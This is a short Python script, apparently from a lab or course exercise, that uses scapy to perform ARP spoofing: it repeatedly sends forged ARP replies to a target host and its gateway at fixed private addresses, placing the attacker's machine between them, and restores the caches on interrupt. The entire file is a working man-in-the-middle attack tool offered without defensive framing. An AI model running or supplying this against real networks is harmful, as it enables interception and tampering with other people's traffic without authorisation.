#!/usr/bin/env python

# scapy.ls(scapy.ARP) ==> allow to list fields of an object
# print(packet.show()) ==> show content of the packet
# print(packet.summary()) ==> resume packet message, sort of

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, hwsrc="08:00:27:35:ce:be", psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.6"
gateway_ip = "10.0.2.1"
try:
    sent_packet_count = 0
    while 42:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Sent " + str(sent_packet_count) + " packets", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C .... Quitting")
    restore(target_ip, gateway_ip)
